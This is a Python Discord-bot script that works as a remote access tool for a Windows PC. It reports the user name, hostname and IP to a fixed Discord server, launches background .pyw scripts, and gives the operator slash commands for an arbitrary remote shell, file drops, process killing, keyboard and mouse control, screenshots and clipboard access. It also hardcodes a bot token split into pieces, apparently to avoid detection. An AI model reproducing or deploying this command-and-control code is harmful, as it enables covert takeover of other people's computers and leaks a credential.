try:
	import interactions
	from interactions.ext.paginators import Paginator
except:
	os.system("python -m pip install discord-py-interactions")
finally:
	import interactions
	from interactions.ext.paginators import Paginator

try:
	import requests
except:
	os.system("python -m pip install requests")
finally:
	import requests

try:
	import pyautogui
except:
	os.system("python -m pip install pyautogui")
finally:
	import pyautogui

try:
	import PIL
except:
	os.system("python -m pip install Pillow")
finally:
	import PIL

try:
	import pyperclip
except:
	os.system("python -m pip install pyperclip")
finally:
	import pyperclip

from io import BytesIO
import os
import json
import socket
import time
import ctypes
import subprocess

TOKEN = ''
parts={'p1':'MTI0NDY3NzkwNTEzNzc5NTEwMg',
'p2':'G8CTrl',
'p3':'BixDvrzbEkIOGc2S3N0x8ZE6rd9V0kelH5sJbs'}
for x in parts:
	TOKEN=TOKEN+parts[x]+'.'
TOKEN=TOKEN[:-1]

pcuser=os.environ['username']
hostname=socket.gethostname()
IPA=socket.gethostbyname(hostname)
projects = ["kopier.pyw", "liv.pyw"]

bot = interactions.Client(token=TOKEN)

def download_file(url, filename):
	response = requests.get(url)
	if response.status_code == 200:
		with open(filename, 'wb') as f:
			f.write(response.content)
		print(f"File '{filename}' downloaded successfully.")
	else:
		print("Failed to download the file.")

def choicelist(opts):
	clist=[]
	for x in opts:
		clist.append(interactions.SlashCommandChoice(name=x, value=x))
	return clist


cat_list=["unknown"]
@interactions.listen()
async def on_ready():
	global cat_list
	print(f'{bot.user} has connected to Discord!')
	
	guild_id = 1222734737416912916
	guild = bot.get_guild(guild_id)
	
	for x in guild.gui_sorted_channels:
		if type(x) == interactions.models.discord.channel.GuildCategory:
			cat_list.append(x.name)
	if pcuser not in cat_list:
		msg = await guild.get_channel(1222734738071093390).send(f"Detected missing category ({pcuser}) Creating...")
		cat = await guild.create_category(pcuser)
		chans_hooks={"log":"Bullshit", "liv": "fps0point2", "esc": "Kopier", "cmd":"Prompter"}
		for x in chans_hooks:
			chan = await guild.create_text_channel(x, category=cat)
			hook = await chan.create_webhook(chans_hooks[x])
			pinmsg = await chan.send(f"Webhook: {chans_hooks[x]}\nURL: {hook.url}")
			await pinmsg.pin()
			chans_hooks[x]=[hook.url, chan.id]
		with open("webhook.json", "w") as f:
			f.write(json.dumps(chans_hooks, indent=4))
		await msg.reply("Done.")
	else:
		with open("webhook.json", "r") as f:
			whData = json.loads(f.read())
		logmsg = await guild.get_channel(whData["log"][1]).send(f"{pcuser} has connected at <t:{int(time.time())}:t> [{int(time.time())}] on {hostname} with {IPA}")
		for x in projects:
			try:
				os.startfile(x)
			except FileNotFoundError:
				await logmsg.reply(f"{x} not found. Dev mode activated.")
				break



@interactions.slash_command(
	name="delete_category",
	description="Deletes a category and all its channels",
	options=[
		interactions.SlashCommandOption(
			name="category",
			description="The name of the category to delete",
			type=interactions.OptionType.CHANNEL,
			required=True,
			channel_types=[interactions.ChannelType.GUILD_CATEGORY]
		)
	]
)
async def delete_category(ctx, category):
	msg = await ctx.send(f"Category {category.name} and all its channels being deleted")
	c = 0
	for channel in category.channels:
		await channel.delete()
		c=c+1
	await category.delete()
	await msg.reply(f"Done. Deleted {c} Channels.")



@interactions.slash_command(
	name="cd_change_dir",
	description="Change Directory or getcwd",
	options=[
		interactions.SlashCommandOption(
			name="path",
			description="cd Path",
			type=interactions.OptionType.STRING,
			required=False
		)
	]
)
async def cd_change_dir(ctx, path=None):
	if str(ctx.channel.category.name) == pcuser:
		if path:
			try:
				os.chdir(path)
				await ctx.send(f"Changed Path to \n {os.getcwd()}")
			except Exception as e:
				await ctx.send(str(e))
		else:
			await ctx.send(f"Current Path is \n {os.getcwd()}")



@interactions.slash_command(
	name="shell",
	description="Command Prompt Shell cmd",
	options=[
		interactions.SlashCommandOption(
			name="cmd",
			description="Command to pass",
			type=interactions.OptionType.STRING,
			required=True
		)
	]
)
async def shell(ctx, cmd):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
		content = result.stdout + "\n" + result.stderr
		if len(content.strip()) > 0:
			paginator = Paginator.create_from_string(bot, content, page_size=3000)
			await paginator.send(ctx)
		else:
			await ctx.send("EMPTY STRING")



@interactions.slash_command(
	name="purge",
	description="Deletes a specified number of messages in the channel",
	options=[
		interactions.SlashCommandOption(
			name="amount",
			description="he number of messages to delete",
			type=interactions.OptionType.INTEGER,
			min_value=1,
			required=True
		),
		interactions.SlashCommandOption(
			name="after",
			description="ID of messages to search after",
			type=interactions.OptionType.STRING,
			required=False
		),
		interactions.SlashCommandOption(
			name="before",
			description="ID of messages to search before",
			type=interactions.OptionType.STRING,
			required=False
		)
	]
)
async def purge(ctx, amount, after=None, before=None):
	await ctx.defer()
	if after!=None:
		after = after.split("-")[1]
	if before!=None:
		before = before.split("-")[1]
	await ctx.channel.purge(deletion_limit=amount, after=after, before=before)
	await ctx.send(f"{amount} messages purged successfully.", delete_after=5)



@interactions.slash_command(
	name="get_pyw",
	description="Gets pwy",
)
async def get_pyw(ctx):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		result = subprocess.run("wmic process where \"name='pyw.exe'\" get ProcessId,CommandLine", capture_output=True, text=True, shell=True)
		content = result.stdout + "\n" + result.stderr
		if len(content.strip()) > 0:
			paginator = Paginator.create_from_string(bot, content, page_size=3000)
			await paginator.send(ctx)
		else:
			await ctx.send("EMPTY STRING")


@interactions.slash_command(
	name="relax",
	description="Set or get relax time",
	options=[
		interactions.SlashCommandOption(
			name="rtime",
			description="Relax time in seconds",
			type=interactions.OptionType.INTEGER,
			min_value=2,
			required=False
		)
	]
)
async def relax(ctx, rtime=None):
	if ctx.channel.category.name == pcuser:
		if rtime is not None:
			relax_time = rtime
			with open("relax.json", "w") as f:
				json.dump({"time": relax_time}, f, indent=4)
			await ctx.send(f"Relax time set to {relax_time} seconds.")
		else:
			try:
				with open("relax.json", "r") as f:
					data = json.load(f)
					relax_time = data.get("time", "not set")
					await ctx.send(f"Current relax time is {relax_time} seconds.")
			except FileNotFoundError:
				await ctx.send("Relax time is not set.")


@interactions.slash_command(
	name="taskkill",
	description="Kill task",
	options=[
		interactions.SlashCommandOption(
			name="pid",
			description="Process ID",
			type=interactions.OptionType.INTEGER,
			required=True
		),
		interactions.SlashCommandOption(
			name="isforce",
			description="Force kill the process",
			type=interactions.OptionType.BOOLEAN,
			required=False
		)
	]
)
async def taskkill(ctx, pid: int, isforce: bool = False):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		if isforce:
			result = subprocess.run(f"taskkill /pid {pid} /f", capture_output=True, text=True, shell=True)
		else:
			result = subprocess.run(f"taskkill /pid {pid}", capture_output=True, text=True, shell=True)
		content = result.stdout + "\n" + result.stderr
		if len(content.strip()) > 0:
			paginator = Paginator.create_from_string(bot, content, page_size=3000)
			await paginator.send(ctx)
		else:
			await ctx.send("EMPTY STRING")


@interactions.slash_command(
	name="autodist",
	description="autodist.py",
	options=[
		interactions.SlashCommandOption(
			name="pwd",
			description="Password",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=True
		)
	]
)
async def autodist(ctx, pwd: int):
	if ctx.channel.category.name == pcuser:
		result = subprocess.run(["pyw", "autodist.pyw", str(pwd)], capture_output=True, text=True)
		await ctx.send(f"stdout:\n``` {result.stdout} ```\nstderr:\n``` {result.stderr} ```")



@interactions.message_context_menu(name="Download")
async def dload(ctx):
	message = ctx.target
	await ctx.defer()
	if str(ctx.target.channel.category.name) == pcuser:
		if message.attachments:
			for attachment in message.attachments:
				file_path = os.path.join(os.getcwd(), attachment.filename)
				download_file(attachment.url, attachment.filename)
				await ctx.send(content=f'File saved at: {os.path.abspath(file_path)}')
		else:
			await ctx.send(content="No attachments found in the selected message.")
	else:
		print(ctx.target.channel.category, pcuser, ctx.target.channel.category==pcuser)



@interactions.slash_command(
	name="allkeys",
	description="Gets allkey",
)
async def allkeys(ctx: interactions.ComponentContext):
	await ctx.send(f"```{pyautogui.KEYBOARD_KEYS}```")



@interactions.subcommand(
	base="mouse",
	name="move",
	description="Move the mouse by a specified amount",
	options=[
		interactions.SlashCommandOption(
			name="x_coord",
			description="X-coordinate",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=False
		),
		interactions.SlashCommandOption(
			name="y_coord",
			description="Y-coordinate",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=False
		),
		interactions.SlashCommandOption(
			name="time",
			description="Time in seconds (default: 0.1)",
			type=interactions.OptionType.NUMBER,  # Float type
			required=False
		)
	]
)
async def _mouse_move(ctx, x_coord: int=0, y_coord: int=0, time: float = 0.1):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.move(x_coord, y_coord, time)
		await ctx.send(f"Action: move, X: {x_coord}, Y: {y_coord}, Time: {time}")

@interactions.subcommand(
	base="mouse",
	name="move_to",
	description="Move the mouse to a specified position",
	options=[
		interactions.SlashCommandOption(
			name="x_coord",
			description="X-coordinate",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=True
		),
		interactions.SlashCommandOption(
			name="y_coord",
			description="Y-coordinate",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=True
		),
		interactions.SlashCommandOption(
			name="time",
			description="Time in seconds (default: 0.1)",
			type=interactions.OptionType.NUMBER,  # Float type
			required=False
		)
	]
)
async def _mouse_move_to(ctx, x_coord: int, y_coord: int, time: float = 0.1):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.moveTo(x_coord, y_coord, time)
		await ctx.send(f"Action: move_to, X: {x_coord}, Y: {y_coord}, Time: {time}")

@interactions.subcommand(
	base="mouse",
	name="click",
	description="Click the mouse button",
	options=[
		interactions.SlashCommandOption(
			name="button",
			description="Mouse button (default: left)",
			type=interactions.OptionType.STRING,  # String type
			required=False,
			choices=[
				{"name": "Left", "value": "left"},
				{"name": "Right", "value": "right"},
				{"name": "Middle", "value": "middle"}
			]
		),
		interactions.SlashCommandOption(
			name="clicks",
			description="Number of clicks (default: 1)",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=False
		)
	]
)
async def _mouse_click(ctx, button: str = "left", clicks: int = 1):
	if str(ctx.channel.category.name) == pcuser:
		pyautogui.click(button=button, clicks=clicks)
		await ctx.send(f"Action: click, Button: {button}, Clicks: {clicks}")

@interactions.subcommand(
	base="mouse",
	name="drag",
	description="Drag the mouse by a specified amount",
	options=[
		interactions.SlashCommandOption(
			name="x_coord",
			description="X-coordinate",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=False
		),
		interactions.SlashCommandOption(
			name="y_coord",
			description="Y-coordinate",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=False
		),
		interactions.SlashCommandOption(
			name="time",
			description="Time in seconds (default: 0.1)",
			type=interactions.OptionType.NUMBER,  # Float type
			required=False
		)
	]
)
async def _mouse_drag(ctx, x_coord: int=0, y_coord: int=0, time: float = 0.1):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.drag(x_coord, y_coord, time)
		await ctx.send(f"Action: drag, X: {x_coord}, Y: {y_coord}, Time: {time}")

@interactions.subcommand(
	base="mouse",
	name="drag_to",
	description="Drag the mouse to a specified position",
	options=[
		interactions.SlashCommandOption(
			name="x_coord",
			description="X-coordinate",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=True
		),
		interactions.SlashCommandOption(
			name="y_coord",
			description="Y-coordinate",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=True
		),
		interactions.SlashCommandOption(
			name="time",
			description="Time in seconds (default: 0.1)",
			type=interactions.OptionType.NUMBER,  # Float type
			required=False
		)
	]
)
async def _mouse_drag_to(ctx, x_coord: int, y_coord: int, time: float = 0.1):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.dragTo(x_coord, y_coord, time)
		await ctx.send(f"Action: drag_to, X: {x_coord}, Y: {y_coord}, Time: {time}")





@interactions.slash_command(name="scroll",
			 description="Perform scroll actions",
			 options=[
				 interactions.SlashCommandOption(
					 name="clicks",
					 description="Number of scroll clicks",
					 type=interactions.OptionType.INTEGER,  # Integer type
					 required=True
				 ),
				 interactions.SlashCommandOption(
					 name="direction",
					 description="Scroll direction",
					 type=interactions.OptionType.STRING,  # String type
					 required=False,
					 choices=[
						 {"name": "Vertical", "value": "vertical"},
						 {"name": "Horizontal", "value": "horizontal"}
					 ]
				 )
			 ])
async def scroll(ctx, clicks: int, direction: str = "vertical"):
	if ctx.channel.category.name == pcuser:
		await ctx.defer()
		if direction=="vertical":
			pyautogui.scroll(clicks)
		elif direction=="horizontal":
			pyautogui.hscroll(clicks)
		else:
			await ctx.send(f"Scroll Direction: {direction} INVALID")
		await ctx.send(f"Scroll Direction: {direction}, Clicks: {clicks}")





@interactions.subcommand(
	base="keyboard",
	name="write",
	description="Type out the given text",
	options=[
		interactions.SlashCommandOption(
			name="input_text",
			description="Text to write",
			type=interactions.OptionType.STRING,  # String type
			required=True
		)
	]
)
async def _keyboard_write(ctx, input_text: str):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.write(input_text)
		await ctx.send(f"Action: write, Input: {input_text}")

@interactions.subcommand(
	base="keyboard",
	name="press",
	description="Press a key a specified number of times",
	options=[
		interactions.SlashCommandOption(
			name="input_text",
			description="Key to press",
			type=interactions.OptionType.STRING,  # String type
			required=True
		),
		interactions.SlashCommandOption(
			name="times",
			description="Number of times to press the key",
			type=interactions.OptionType.INTEGER,  # Integer type
			required=False)
	]
)
async def _keyboard_press(ctx, input_text: str, times: int = 1):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.press(input_text, presses=times)
		await ctx.send(f"Action: press, Key: {input_text}, Times: {times}")

@interactions.subcommand(
	base="keyboard",
	name="keyup",
	description="Release a key",
	options=[
		interactions.SlashCommandOption(
			name="input_text",
			description="Key to release",
			type=interactions.OptionType.STRING,  # String type
			required=True
		)
	]
)
async def _keyboard_keyup(ctx, input_text: str):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.keyUp(input_text)
		await ctx.send(f"Action: keyup, Key: {input_text}")

@interactions.subcommand(
	base="keyboard",
	name="keydown",
	description="Hold down a key",
	options=[
		interactions.SlashCommandOption(
			name="input_text",
			description="Key to hold down",
			type=interactions.OptionType.STRING,  # String type
			required=True
		)
	]
)
async def _keyboard_keydown(ctx, input_text: str):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.keyDown(input_text)
		await ctx.send(f"Action: keydown, Key: {input_text}")

@interactions.subcommand(
	base="keyboard",
	name="hotkey",
	description="Press a combination of keys",
	options=[
		interactions.SlashCommandOption(
			name="input_text",
			description="Keys to press in combination, separated by spaces",
			type=interactions.OptionType.STRING,  # String type
			required=True
		)
	]
)
async def _keyboard_hotkey(ctx, input_text: str):
	if str(ctx.channel.category.name) == pcuser:
		await ctx.defer()
		pyautogui.hotkey(*input_text.split(" "))
		await ctx.send(f"Action: hotkey, Keys: {input_text}")




@interactions.slash_command(name="cursor",
			 description="Capture a screenshot with cursor in the middle",
			 options=[
				 interactions.SlashCommandOption(
					 name="pixels",
					 description="Size of the screenshot in pixels (e.g., 800)",
					 type=interactions.OptionType.INTEGER,  # Integer type
					 required=True
				 )
			 ])
async def cursor(ctx, pixels: int):
	if ctx.channel.category.name == pcuser:
		await ctx.defer()
		x, y = pyautogui.position()
		
		# Calculate screenshot coordinates with cursor in the middle
		x_start = max(0, x - pixels // 2)
		y_start = max(0, y - pixels // 2)
		x_end = min(pyautogui.size().width, x + pixels // 2)
		y_end = min(pyautogui.size().height, y + pixels // 2)
		
		# Capture screenshot
		screenshot = pyautogui.screenshot(region=(x_start, y_start, x_end - x_start, y_end - y_start))
		
		# Save screenshot to bytes
		img_byte_array = BytesIO()
		screenshot.save(img_byte_array, format="PNG")
		img_byte_array.seek(0)
		
		# Send the screenshot along with cursor coordinates
		await ctx.send(f"Cursor position: ({x}, {y})", file=interactions.File(img_byte_array, "screenshot.png"))



@interactions.message_context_menu(name="Copy")
async def pypercopy1(ctx):
	message = ctx.target
	await ctx.defer()
	if str(ctx.target.channel.category.name) == pcuser:
		pyperclip.copy(message.content)
		await ctx.send(f"Copied `{message.content[:20]}...` {message.jump_url}")
	else:
		print(ctx.target.channel.category, pcuser, ctx.target.channel.category==pcuser)



@interactions.slash_command(name="copy",
			 description="Copy to clipboard",
			 options=[
				 interactions.SlashCommandOption(
					 name="text",
					 description="Text to copy",
					 type=interactions.OptionType.STRING,  # Integer type
					 required=True
				 )
			 ])
async def pypercopy(ctx, text: str):
	if ctx.channel.category.name == pcuser:
		pyperclip.copy(text)
		await ctx.send(f"Copied `{text[:20]}...`")


@interactions.listen(interactions.api.events.CommandCompletion)
async def channel_create(event):
	await bot.change_presence(activity=pcuser)


bot.start()
